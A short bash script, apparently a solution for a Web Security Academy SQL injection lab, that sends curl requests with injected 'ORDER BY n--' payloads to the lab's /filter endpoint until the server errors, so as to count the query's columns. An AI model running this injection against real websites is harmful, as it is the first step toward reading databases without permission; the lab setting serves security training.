#!/bin/bash
if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain";
	exit 1;
fi
url="https://$1.web-security-academy.net";

echo -n "Finding number of columns... ";
i=1;
until curl \
	-s \
	-G "$url/filter" \
	--data-urlencode "category=Gifts' ORDER BY $((i + 1))--" |
	grep '^Internal Server Error$' > /dev/null; do
		i=$((i+1));
	done;
echo $i;
